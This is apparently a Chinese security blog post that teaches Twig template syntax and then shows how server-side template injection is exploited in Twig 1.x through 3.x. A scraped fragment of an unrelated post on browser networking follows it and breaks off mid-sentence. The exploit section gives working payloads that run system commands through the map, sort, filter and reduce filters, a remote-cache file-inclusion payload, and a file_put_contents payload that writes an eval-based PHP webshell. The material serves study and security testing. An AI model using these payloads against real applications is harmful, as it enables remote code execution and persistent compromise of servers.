的位置上填充了 Fabien require_once \u0026#39;/path/to/vendor/autoload.php\u0026#39;; $loader = new \\Twig\\Loader\\ArrayLoader([ \u0026#39;index\u0026#39; =\u0026gt; \u0026#39;Hello {{ name }}!\u0026#39;, ]); $twig = new \\Twig\\Environment($loader); echo $twig-\u0026gt;render(\u0026#39;index\u0026#39;, [\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;Fabien\u0026#39;]); 另一种形式的加载起就是直接将模板以文件的形式进行存储，我认为这也是更为常见的形式，用到的加载器类是 FilesystemLoader 可以直接加载存储模板的目录 可以看到这里变成了加载一个模板文件 index.html $loader = new \\Twig\\Loader\\FilesystemLoader(\u0026#39;/path/to/templates\u0026#39;); $twig = new \\Twig\\Environment($loader, [ \u0026#39;cache\u0026#39; =\u0026gt; \u0026#39;/path/to/compilation_cache\u0026#39;, ]); echo $twig-\u0026gt;render(\u0026#39;index.html\u0026#39;, [\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;Fabien\u0026#39;]); 基础语法 参考：Twig for Template Designers 就像我们在模板引擎一节中提到的那样，模板，template本质上就是一个文本文件，通过与数据库的数据进行结合之后，用来生成我们所需要的任何基于文本的格式文件 (e.g., HTML, XML, CSV, LaTeX)，因此也没有特别的后缀名，.html, .xml, .twig 都可以 模板中含有 variables 变量 或者 expressions 表达式, 当模板被模板引擎激活的时候这些内容就会被替换，还有 tags 标签, 用来控制模板的逻辑 接着我们用一个简单的例子来说明一些基础语法 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;My Webpage\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul id=\u0026#34;navigation\u0026#34;\u0026gt; {% for item in navigation %} \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{{ item.href }}\u0026#34;\u0026gt;{{ item.caption }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; \u0026lt;h1\u0026gt;My Webpage\u0026lt;/h1\u0026gt; {{ a_variable }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 上面的html中出现了两种符号： {% \u0026hellip; %} 用来运行指令，比如循环 {{ \u0026hellip; }} 用来输出表达式的结果 变量 {{ foo.bar } 网页应用可以将变量传递到模板中，从而改变模板中的内容。 这些变量同样可以拥有能够访问的属性和子元素，可以使用 . 来进行访问 全局变量 _self: 对于当前模板的引用 _context: 对于上下文的引用 _charset: 对于当前字符集的引用 变量赋值 使用 set 标签为变量赋值 {% set foo = \u0026#39;foo\u0026#39; %} {% set foo = [1, 2] %} {% set foo = {\u0026#39;foo\u0026#39;: \u0026#39;bar\u0026#39;} %} Filters 过滤器 Filter过滤器可以用来修改变量，同时可以使用管道符 | 来间隔多个过滤器从而对变量进行多次的处理，每一个过滤器处理的结果会传递到下一个 {{ name|striptags|title }} // {{ \u0026#39;\u0026lt;a\u0026gt;whoami\u0026lt;a\u0026gt;\u0026#39;|striptags|title }} // Output: Whoami! 上面的表达式就是对 name 这个变量进行修改，首先通过 striptags 移除所有的HTML标签，然后再利用 title 进行首字母大写 {{ list|join(\u0026#39;, \u0026#39;) }} {{ list|join }} {{ list|join(\u0026#39;, \u0026#39;) }} // {{ [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]|join }} // Output: abc // {{ [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]|join(\u0026#39;|\u0026#39;) }} // Output: a|b|c 过滤器同样可以设置参数来对变量进行处理 比如上面的表达式， list 是一个列表，利用 join 标签对其中的元素进行组合，并且设置参数使用 , 进行分隔 如果需要对一个区域的HTML代码进行处理，可以使用 apply 标签，这将可以使一个区域的所有文字内容都变成大写 {% apply upper %} This text becomes uppercase {% endapply %} 更多过滤器的内容详见：Filters 函数 Twig内置了一些函数可供使用，和常见的语言类似，只需要函数名+()就可以调用函数，同时也可以使用参数名来对参数进行赋值 {% for i in range(0, 3) %} {{ i }}, {% endfor %} {% for i in range(low=1, high=10, step=2) %} {{ i }}, {% endfor %} 更多函数的内容详见：functions 控制结构 控制结构指的就是那些可以控制程序执行的结构，例如if/elseif/else,for等带有条件的结构，在twig中需要用 {% ... %} 来包裹使用 for标签 \u0026lt;h1\u0026gt;Members\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; {% for user in users %} \u0026lt;li\u0026gt;{{ user.username|e }}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; if标签 {% if users|length \u0026gt; 0 %} \u0026lt;ul\u0026gt; {% for user in users %} \u0026lt;li\u0026gt;{{ user.username|e }}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; {% endif %} 更多内置标签的信息详见：tags 注释 使用 {# ... #} 对模板内的代码块进行注释 {# note: disabled template because we no longer use this {% for user in users %} ... {% endfor %} #} 包含其他的模板 include 函数可以将另一个模板所渲染的内容包含在当前模板中 {{ include(\u0026#39;sidebar.html\u0026#39;) }} 被包含的模板将与当前模板共享上下文的全局变量 {% for box in boxes %} {{ include(\u0026#39;render_box.html\u0026#39;) }} {% endfor %} 例如被包含的模板 render_box.html 就可以访问当前模板中的变量 box 模板继承 Twig中最强大的功能就是模板继承，模板继承功能允许你构建一个基础的模板骨架，其中包括了所有网站需要的内容，并预留出 blocks 区块 以供子模板来进行重写 我们来看一个简单的例子 我们构建一个基础模板 base.html如下 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; {% block head %} \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;/\u0026gt; \u0026lt;title\u0026gt;{% block title %}{% endblock %} - My Webpage\u0026lt;/title\u0026gt; {% endblock %} \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt;{% block content %}{% endblock %}\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;footer\u0026#34;\u0026gt; {% block footer %} \u0026amp;copy; Copyright 2011 by \u0026lt;a href=\u0026#34;http://domain.invalid/\u0026#34;\u0026gt;you\u0026lt;/a\u0026gt;. {% endblock %} \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在上面的例子中， 一共有4个block标签：head, title, content, footer，都表示需要子模板来对这些block进行填充 一个子模板可能长这样： {% extends \u0026#34;base.html\u0026#34; %} {% block title %}Index{% endblock %} {% block head %} {{ parent() }} \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .important { color: #336699; } \u0026lt;/style\u0026gt; {% endblock %} {% block content %} \u0026lt;h1\u0026gt;Index\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;important\u0026#34;\u0026gt; Welcome to my awesome homepage. \u0026lt;/p\u0026gt; {% endblock %} 首先使用 extends 标签来继承父模板，需要作为第一个标签放在子模板中，然后就可以对不同的block进行重写，当然可一般的语言一样，可以使用 parent() 方法来继承父模板中渲染的内容，默认情况下，如果没有对block进行重写，那么就默认输出父模板中的渲染内容，就像这里的 footer block 一样 HTML字符逃逸 为了防止在模板在生成HTML的时其中的变量加入了一些意料之外的字符导致结果出现问题，Twig提供了两种方法来手动和自动地逃逸这些特殊字符 手动逃逸: 使用 espace/e 过滤器来进行手动逃逸 {{ user.username|escape }} {{ user.username|e }} escape 过滤器默认是对HTML进行操作，也可以更改为其他的策略 {{ user.username|e(\u0026#39;js\u0026#39;) }} {{ user.username|e(\u0026#39;css\u0026#39;) }} {{ user.username|e(\u0026#39;url\u0026#39;) }} {{ user.username|e(\u0026#39;html_attr\u0026#39;) }} 自动逃逸: Twig提供了表达式可以对一个区域的代码进行统一的字符逃逸，同样默认是针对HTML的，也可以改为其他的策略 {% autoescape %} Everything will be automatically escaped in this block (using the HTML strategy) {% endautoescape %} {% autoescape \u0026#39;js\u0026#39; %} Everything will be automatically escaped in this block (using the JS strategy) {% endautoescape %} 如果我们想要在模板中输出 {{ 而不被当作时模板的变量，可以使用以下表达式，直接进行一个变量表达 {{ \u0026#39;{{\u0026#39; }} Twig的API使用 在上一节中我们介绍了如何设计Twig模板，在本章中，我们将会介绍如何使用Twig的API来对模板进行操作，本节主要参考：Twig for Developers 从官网文档的标题，也很能体现模板引擎的意义，Twig for Template Designers主要就是写给那些设计模板，页面的显示内容的人（前端？），而Twig for Developers更多的是针对模板内容的处理，这样就很好的把模板和数据操作分开，把显示和内容分开。 Environment 环境 下面的这个例子我们已经在简介那一节中见过了，Twig会创建一个 \\Twig\\Environment 类的对象（实例）来保存配置以及扩展内容，同时也用来加载模板。 通常来说大部分的应用会创建一个统一的环境对象来存储所有的模板，但是也可以创建多个环境来存储不同的配置，配置的设置就是 \\Twig\\Environment 构造器的第二个参数，这其实是一个数组，可以存储任何对于环境的配置信息。 比如这里的 cache 就是指定了模板编译的缓存地址，用来存储已经编译过的模板来避免对于解析阶段的请求（没编译好就请求，这里不太懂） require_once \u0026#39;/path/to/vendor/autoload.php\u0026#39;; $loader = new \\Twig\\Loader\\FilesystemLoader(\u0026#39;/path/to/templates\u0026#39;); $twig = new \\Twig\\Environment($loader, [ \u0026#39;cache\u0026#39; =\u0026gt; \u0026#39;/path/to/compilation_cache\u0026#39;, ]); Rendering Templates 渲染模板 想要加载一个Twig环境中的模板，可以使用 load() 函数，其会返回一个 \\Twig\\TemplateWrapper 实例 $template = $twig-\u0026gt;load(\u0026#39;index.html\u0026#39;); 想要将变量的值渲染到模板上去，可以使用 render() 函数 echo $template-\u0026gt;render([\u0026#39;the\u0026#39; =\u0026gt; \u0026#39;variables\u0026#39;, \u0026#39;go\u0026#39; =\u0026gt; \u0026#39;here\u0026#39;]); 更多加载和渲染的例子 echo $twig-\u0026gt;render(\u0026#39;index.html\u0026#39;, [\u0026#39;the\u0026#39; =\u0026gt; \u0026#39;variables\u0026#39;, \u0026#39;go\u0026#39; =\u0026gt; \u0026#39;here\u0026#39;]); # 加载和渲染在一起 echo $template-\u0026gt;renderBlock(\u0026#39;block_name\u0026#39;, [\u0026#39;the\u0026#39; =\u0026gt; \u0026#39;variables\u0026#39;, \u0026#39;go\u0026#39; =\u0026gt; \u0026#39;here\u0026#39;]); # 只渲染单独的区块 Loaders 加载器 加载器的主要职责就是加载模板（例如从文件系统中） Compilation Cache 编译缓存: 所有的模板加载器都会将文件系统中编译过的模板存储在缓存中以供将来使用，以此来提高使用的效率，不用重复加载 内置的加载器: 1. \\Twig\\Loader\\FilesystemLoader, 加载器从文件系统中加载模板 ```php $loader = new \\Twig\\Loader\\FilesystemLoader($templateDir); # 从目标路径中加载目录 $loader = new \\Twig\\Loader\\FilesystemLoader([$templateDir1, $templateDir2]); # 依次尝试数组中的目录 ``` \\Twig\\Loader\\ArrayLoader, 加载器从PHP数组中加载模板，下面的例子就是加载了一个\u0026rsquo;index.html\u0026rsquo; =\u0026gt; \u0026lsquo;Hello {{ name }}!\u0026lsquo;的数组 $loader = new \\Twig\\Loader\\ArrayLoader([ \u0026#39;index.html\u0026#39; =\u0026gt; \u0026#39;Hello {{ name }}!\u0026#39;, ]); $twig = new \\Twig\\Environment($loader); echo $twig-\u0026gt;render(\u0026#39;index.html\u0026#39;, [\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;Fabien\u0026#39;]); \\Twig\\Loader\\ChainLoader 可以将多个加载器合并，统一放到环境中 $loader1 = new \\Twig\\Loader\\ArrayLoader([ \u0026#39;base.html\u0026#39; =\u0026gt; \u0026#39;{% block content %}{% endblock %}\u0026#39;, ]); $loader2 = new \\Twig\\Loader\\ArrayLoader([ \u0026#39;index.html\u0026#39; =\u0026gt; \u0026#39;{% extends \u0026#34;base.html\u0026#34; %}{% block content %}Hello {{ name }}{% endblock %}\u0026#39;, \u0026#39;base.html\u0026#39; =\u0026gt; \u0026#39;Will never be loaded\u0026#39;, ]); $loader = new \\Twig\\Loader\\ChainLoader([$loader1, $loader2]); $twig = new \\Twig\\Environment($loader); 漏洞利用 在介绍了Twig的基础模板语法与API使用之后，我们来看看不同版本的Twig都有哪些漏洞可以利用 1.x 我们回顾一下之前在基础语法中提到过，Twig拥有三个全局变量 _self: 对于当前模板对象实例的引用 _context: 对于上下文的引用 _charset: 对于当前字符集的引用 setCache\n在1.x版本中，我们主要就是要利用其中的其中的 _self 变量，因为其代表了对于当前模板对象实例（\\Twig\\Template）的引用，其中包含的 env 属性指向了 \\Twig\\Environment 对象实例的引用，这样我们就可以继续利用Twig环境对象实例中的方法 常见的 payload 就有： {{_self.env.setCache(\u0026#34;ftp://ip:port\u0026#34;)}}{{_self.env.loadTemplate(\u0026#34;backdoor\u0026#34;)}} setCache是我们之前提到过的，设置编译模板的缓存目录，接着在我们改变当前模板的缓存目录之后，再次调用 loadTemplate 函数就可以包含任意我们想要的文件了，在allow_url_include开启的条件下，我们就实现了远程文件包含 getFilter\npublic function getFilter($name) { ... foreach ($this-\u0026gt;filterCallbacks as $callback) { if (false !== $filter = call_user_func($callback, $name)) { return $filter; } } return false; } public function registerUndefinedFilterCallback($callable) { $this-\u0026gt;filterCallbacks[] = $callable; } 我们可以从 getFilter 源码中发现危险函数 call_user_func, 通过传入 $name 参数到该函数中，就可以调用任意PHP函数 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;id\u0026#34;)}} // Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) 在Twig 2.x 以及 3.x 的版本中， _self 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 Figure 1: Deprecated Features of Twig 1.x\n同时 getFilter 方法中也不再包含危险的函数了： public function getFilter(string $name): ?TwigFilter { if (!$this-\u0026gt;initialized) { $this-\u0026gt;initExtensions(); } if (isset($this-\u0026gt;filters[$name])) { return $this-\u0026gt;filters[$name]; } foreach ($this-\u0026gt;filters as $pattern =\u0026gt; $filter) { $pattern = str_replace(\u0026#39;\\\\*\u0026#39;, \u0026#39;(.*?)\u0026#39;, preg_quote($pattern, \u0026#39;#\u0026#39;), $count); if ($count \u0026amp;\u0026amp; preg_match(\u0026#39;#^\u0026#39;.$pattern.\u0026#39;$#\u0026#39;, $name, $matches)) { array_shift($matches); $filter-\u0026gt;setArguments($matches); return $filter; } } foreach ($this-\u0026gt;filterCallbacks as $callback) { if (false !== $filter = $callback($name)) { return $filter; } } return null; } public function registerUndefinedFilterCallback(callable $callable): void { $this-\u0026gt;filterCallbacks[] = $callable; } 我觉得这就是一个很好的思路，在我们进行代码审计的时候，可以先找到这些危险的函数，然后再追溯其的使用，判断是否会有用户的输出能够调用这类函数 2.x / 3.x 在2.x / 3.x中， _self 变量已经没法被我们所利用了，但是我们可以借助新版本中的一些过滤器来实现攻击的目的。 我们将介绍4个过滤器： map\nmap 过滤器将一个 arrow function 应用于 sequence 或者 mapping （因为没有中文文档，所以不是很敢翻译这些既陌生又熟悉的名词，大家可以根据例子体会一下），文档详见：map {% set people = [ {first: \u0026#34;Bob\u0026#34;, last: \u0026#34;Smith\u0026#34;}, {first: \u0026#34;Alice\u0026#34;, last: \u0026#34;Dupond\u0026#34;}, ] %} {{ people|map(p =\u0026gt; \u0026#34;#{p.first} #{p.last}\u0026#34;)|join(\u0026#39;, \u0026#39;) }} {# outputs Bob Smith, Alice Dupond #} 同时 arrow function 也可以接受mapping键值对的 key 的内容作为作为第二个参数 {% set people = { \u0026#34;Bob\u0026#34;: \u0026#34;Smith\u0026#34;, \u0026#34;Alice\u0026#34;: \u0026#34;Dupond\u0026#34;, } %} {{ people|map((value, key) =\u0026gt; \u0026#34;#{key} #{value}\u0026#34;)|join(\u0026#39;, \u0026#39;) }} {# outputs Bob Smith, Alice Dupond #} 注意：这里的 arrow_function 是可以访问当前的全局变量 $context 的 那当我们使用如下例子的时候： {{[\u0026#34;Mark\u0026#34;]|map((arg)=\u0026gt;\u0026#34;Hello #{arg}!\u0026#34;)}} Twig 3.x 会将其编译成如下php代码： twig_array_map([0 =\u0026gt; \u0026#34;Mark\u0026#34;], function ($__arg__) use ($context, $macros) { $context[\u0026#34;arg\u0026#34;] = $__arg__; return (\u0026#34;hello \u0026#34; . ($context[\u0026#34;arg\u0026#34;] ?? null))}) 第一个参数就是经过map处理过的数组参数 [\u0026ldquo;Mark\u0026rdquo;] 第二个参数就是一个 arrow function 其中的 twig_array_map 方法的源码如下： function twig_array_map($array, $arrow) { $r = []; foreach ($array as $k =\u0026gt; $v) { $r[$k] = $arrow($v, $k); // 直接将 $arrow 当做函数执行 } return $r; } 我们可以从代码中观察得到： $array = [0 =\u0026gt; \u0026ldquo;Mark\u0026rdquo;] $arrow = function\u0026hellip; $k, $v 就是$array中的key \u0026amp; value 并且$arrow直接就不经检查就默认作为函数来进行调用 而$array就被转化为 $arrow函数所需要的两个参数 因此我们自然可以想到如果我们修改 twig_array_map 的两个参数，将 $arrow 改成命令执行函数，同样会被直接当作函数执行，那么就可以实现RCE，而原本的Array就会作为函数的参数配合使用 system ( string $command [, int \u0026amp;$return_var ] ) : string passthru ( string $command [, int \u0026amp;$return_var ] ) exec ( string $command [, array \u0026amp;$output [, int \u0026amp;$return_var ]] ) : string shell_exec ( string $cmd ) : string 前三个函数都可以使用，Payload如下： {{[\u0026#34;id\u0026#34;]|map(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;exec\u0026#34;)}} // 无回显 就可以执行 id 命令，输出系统id的信息了 如果命令执行函数都被禁用，还可以尝试其他函数来执行任意代码： {{[\u0026#34;phpinfo();\u0026#34;]|map(\u0026#34;assert\u0026#34;)|join(\u0026#34;,\u0026#34;)}} // assert(\u0026#39;phpinfo();\u0026#39;) {{{\u0026#34;\u0026lt;?php phpinfo();eval($_POST[whoami])\u0026#34;:\u0026#34;/var/www/html/shell.php\u0026#34;}|map(\u0026#34;file_put_contents\u0026#34;)}} // 写 Webshell 我们利用 $arrow 可以不经检查就被直接当作函数来执行的特点，还可以发现其他的几个过滤器也存在相同的问题 sort\nsort 过滤器可以用来给数组进行排序，介绍详见：sort {% for user in users|sort %} ... {% endfor %} 我们同样可以将一个 arrow function 作为参数传入来实现更为复杂的排序方法，这机会不就来了 {% set fruits = [ { name: \u0026#39;Apples\u0026#39;, quantity: 5 }, { name: \u0026#39;Oranges\u0026#39;, quantity: 2 }, { name: \u0026#39;Grapes\u0026#39;, quantity: 4 }, ] %} {% for fruit in fruits|sort((a, b) =\u0026gt; a.quantity \u0026lt;=\u0026gt; b.quantity)|column(\u0026#39;name\u0026#39;) %} {{ fruit }} {% endfor %} {# output in this order: Oranges, Grapes, Apples #} 在模板被编译后， sort 过滤器会被转化为 twig_sort_filter 函数，源码如下： function twig_sort_filter($array, $arrow = null) { if ($array instanceof \\Traversable) { $array = iterator_to_array($array); } elseif (!\\is_array($array)) { throw new RuntimeError(sprintf(\u0026#39;The sort filter only works with arrays or \u0026#34;Traversable\u0026#34;, got \u0026#34;%s\u0026#34;.\u0026#39;, \\gettype($array))); } if (null !== $arrow) { uasort($array, $arrow); // 直接被 uasort 调用 } else { asort($array); } return $array; } Figure 2: uasort 函数测试命令行执行\n同样可以用来进行远程代码执行，payload如下： {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;exec\u0026#34;)}} // 无回显 filter\nfilter 过滤器，原汁原味的过滤器，主要功能就是通过给定条件来筛选数据，详见：filter filter 过滤器可以通过传入一个 arrow function 来规定想要的数据的范围 下面的例子就是通过filter过滤器来选出数组中大于38的值 {% set sizes = [34, 36, 38, 40, 42] %} {{ sizes|filter(v =\u0026gt; v \u0026gt; 38)|join(\u0026#39;, \u0026#39;) }} {# output 40, 42 #} 作用于map {% set sizes = { xs: 34, s: 36, m: 38, l: 40, xl: 42, } %} {% for k, v in sizes|filter(v =\u0026gt; v \u0026gt; 38) -%} {{ k }} = {{ v }} {% endfor %} {# output l = 40 xl = 42 #} 同样可以将map中的键值对中的key拿出来作为 arrow_function 的第二个参数 {% for k, v in sizes|filter((v, k) =\u0026gt; v \u0026gt; 38 and k != \u0026#34;xl\u0026#34;) -%} {{ k }} = {{ v }} {% endfor %} {# output l = 40 #} 那么filter过滤器在经过了编译之后会得到 twig_array_filter 函数，同样会调用 array_filter 来直接调用 $arrow ： function twig_array_filter($array, $arrow) { if (\\is_array($array)) { return array_filter($array, $arrow, \\ARRAY_FILTER_USE_BOTH); } // the IteratorIterator wrapping is needed as some internal PHP classes are \\Traversable but do not implement \\Iterator return new \\CallbackFilterIterator(new \\IteratorIterator($array), $arrow); } 我们可以看到这里传入的 $array 以及 $arrow 直接被 array_filter 函数调用： array_filter(array $array, ?callable $callback = null, int $mode = 0): array array_filter的前两个参数分别为 array，用来遍历的数组 callback,用来执行的回调函数 也就是说这里$arrow直接可以配合$array进行执行 Figure 3: array_filter 函数测试命令行执行\n因此也可以payload于之前类似 {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;exec\u0026#34;)}} // 无回显 reduce\nreduce 过滤器将对数组进行处理，通过一个 arrow_function 来定义操作的规则，迭代地将数组中的元素进行合并直至一个元素，详见官方文档：reduce 比如就可以将数组中所有的元素相加 {% set numbers = [1, 2, 3] %} {{ numbers|reduce((carry, v) =\u0026gt; carry + v) }} {# output 6 #} 那么在经过编译之后就会转为利用 twig_array_reduce 方法 function twig_array_reduce($array, $arrow, $initial = null) { if (!\\is_array($array)) { $array = iterator_to_array($array); } return array_reduce($array, $arrow, $initial); // $array, $arrow 和 $initial 直接被 array_reduce 函数调用 } 其中的 array_reduce 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 Figure 4: array_reduce 函数测试命令行调用\n那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： {{[0, 0]|reduce(\u0026#34;system\u0026#34;, \u0026#34;id\u0026#34;)}} {{[0, 0]|reduce(\u0026#34;passthru\u0026#34;, \u0026#34;id\u0026#34;)}} {{[0, 0]|reduce(\u0026#34;exec\u0026#34;, \u0026#34;id\u0026#34;)}} // 无回显 通用payload\n来源：TWIG 全版本通用 SSTI payloads {{[\u0026#34;id\u0026#34;]|map(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;) {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[0, 0]|reduce(\u0026#34;system\u0026#34;, \u0026#34;id\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{{\u0026#34;\u0026lt;?php phpinfo();\u0026#34;:\u0026#34;/var/www/html/shell.php\u0026#34;}|map(\u0026#34;file_put_contents\u0026#34;)}} Reference Twig Twig Docs: Introduction Twig for Template Designers Twig for Developers Twig 模板注入从零到一 map sort filter reduce TWIG 全版本通用 SSTI payloads ","date":"2022-07-01T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/ssti_twig/","title":"SSTI 模板注入: Twig (PHP)"},{"content":"浏览器是如何工作的？ 本文内容主要来源于：Populating the page: how browsers work，再加上本人的理解以及拓展知识的介绍，但是还是建议大家去阅读英文的官方文档，会得到更全面的信息以及拓展资源 快速响应的网站可以为用户提供更好的用户体验，这意味着网站的内容可以: 快速的被加载， 进行流畅的互动。 那么要实现这两个需求，我们就需要考虑Latency加载等待时间，以及认识到浏览器其实在大多数情况下是 单线程 工作的 Latency, 时延，是我们实现快速响应的主要阻力，为了实现快速响应，降低时延，开发者需要尽可能快的发送请求。 在大部分情况下，浏览器都是单线程在工作的，那么我们为了让网站可以流畅的访问，主要的目标就是保证浏览器的主线程在完成浏览器运行的大部分工作的同时，还有余力来处理用户的交互，那么开发者需要认识到这一点，并且尽量降低主线程所分配到的任务，从而使网页的渲染以及用户的交互更为流畅。 Navigation 导航 导航 是加载网页的第一步，导航发生在当用户通过将URL输入地址栏；点击链接；提交表单以及类似的这样的操作 减少在导航上的时间也是优化网页性能的一个重要目标，阻力来源于时延和带宽 DNS Lookup, DNS 查询 对于网页的导航始于找到资源的位置，也就是通过URL来定位资源，比如我们要访问 https://example.com, 其对应的IP地址是 93.184.216.34, 上面存放着的对应的HTML资源，但是我们的浏览器此时还没有访问过这个网页，因此第一步要做的事情就是DNS lookup; 通过DNS查询，name server最终会返回给浏览器域名所对应的IP地址，进而将其缓存以加速未来的访问速度。 那么我们具体到网页上来，DNS查询不只发生在主页面的HTML的获取上，还需要对HTML上所引用的资源逐一进行导航和DNS查询，这就需要开发者对此进行优化，特别是对于移动端用户，每一次DNS查询都意味着需要通过信号塔来访问授权的DNS server,那么根据信号塔的距离就会产生一定的时延 Figure 1: DNS lookup on Mobile devices\nTCP Handshake 经过DNS查询，我们现在已经拿到了目标网页资源所处的IP地址了，接下来就要进行TCP三次握手来进行连接。 通过\u0026quot;SYN, SYN-ACK, ACK\u0026quot; 的三条TCP信息来建立TCP连接。 TLS Negotiation 同时，为了保证安全，我们提倡使用HTTPS协议，其要求在进行基本的TCP三次握手之后，还需要进行进一步的“握手”，来建立安全连接，也就是TLS Negotiation 这将要求额外的5条信息，用来对client以及server进行相互认证，并且确认解码的密钥，来保证数据的保密性 Figure 2: TLS Negotiation\n这五条信息可以概括为三个阶段（参考：Bypassing Web-Application Firewalls by abusing SSL/TLS） ClientHello/ServerHello 打招呼阶段 握手由用户发出clientHello信息开始，这条信息将包含所有服务器所需要的信息，包括cipher suite加密套件（一组算法）以及支持的TLS或者SSL版本; 接着服务器端也会返回对应的ServerHello信息包括接下来将要使用的cipher suite以及SSL版本 Certificate Exchange 证书交换阶段 接下来服务器需要向客户端证明自己的身份，于是向客户端发出自己的certificate证书（和serverHello信息一起发出） Key Exchange 密钥交换阶段 最后为了建立加密的管道，双方需要交换密钥来进行数据的加密和解密 Response 响应 现在浏览器已经和服务器建立了安全的TCP连接了，这时浏览器就会发送一个初始的 HTTP GET request 来请求网页资源，这通常是一个HTML文件，服务器收到了请求，接着返回对应的HTTP headers以及HTML文件的内容 例如： \u0026lt;!doctype HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;title\u0026gt;My simple page\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; src=\u0026#34;styles.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;myscript.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 class=\u0026#34;heading\u0026#34;\u0026gt;My Page\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;A paragraph with a \u0026lt;a href=\u0026#34;https://example.com/about\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;myimage.jpg\u0026#34; alt=\u0026#34;image description\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;anotherscript.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Time to First Byte (TTFB) 表示从用户发出请求（点击连接）到收到第一个HTML的数据包的时间，通常第一块信息的大小是14KB的数据 下面我们会解释为什么第一块信息是14KB的。 Congestion control: TCP Slow Start /14 KB rule TCP慢启动 现在已经建立了安全的连接，接下来服务器将会根据用户的请求返回对应的数据，但是传输的速度（单位时间内传输的数据）并不是从一开始就达到最优的速度的，而是慢慢增加的，为的是防止 网络拥塞 。 网络拥塞：网络拥塞就是一个网络节点需要处理大于他们能力的数据时，网络的性能就会变化，也就会发生拥塞，例如路由器或者用户的设备对于接收到的数据的处理速度跟不上接收速度，那么设备的缓存就会被占满，再接收到的数据就会被丢弃，导致网络性能下降。 在网络层就会发生丢包的现象，而主要的拥塞控制就发生在传输层上 TCP慢启动就是一个用来检测数据传输可使用的带宽，同时平衡网络连接速度的算法，其通过逐渐增加数据传输速度来找到最好的传输速度，从而防止 网络堵塞 的发生。 在讲解算法的具体流程之前，我们需要先了解一些相关概念 congestion window (cwnd) 拥塞窗口，发送方的设置，表示在收到接收方ACK之前，发送方最大允许传输的数据大小 slow start threshold (ssthresh) 来设定慢启动算法使用的阈值 Round-Trip Time (RTT) 往返时延，表示从发送方发出数据开始，到发送发收到来自接收方的ACK，所经历的所有时延 Maximum Transmission Unit (MTU) MTU是可以在网络层可以通信的最大PDU的大小，其应用于网络层，单位一般用字节来设定 在以太网中，最大的frame为1518 bytes，其中18bytes是overhead（headers和检查值），MTU的值就是1500 bytes Protocol data unit (PDU) PDU 是同一层的通信协议之间通信的最小信息单位，例如在OSI模型中： Layer PDU The Layer 4: Transport Layer segment(TCP)/datagram(UDP) The Layer 3: Network Layer packet The Layer 2: Data link layer frame The Layer 1: Physical layer bit, or more generally, symbol Maximum Segment Size (MSS) 最大TCP segment的大小，是TCP的一个参数 根据定义，我们可以得出：一个TCP segment的payload \u0026lt; MSS \u0026lt; MTU cwnd \u0026lt; ssthresh，慢启动算法 - 当一个新的连接建立之后，发送方将初始化 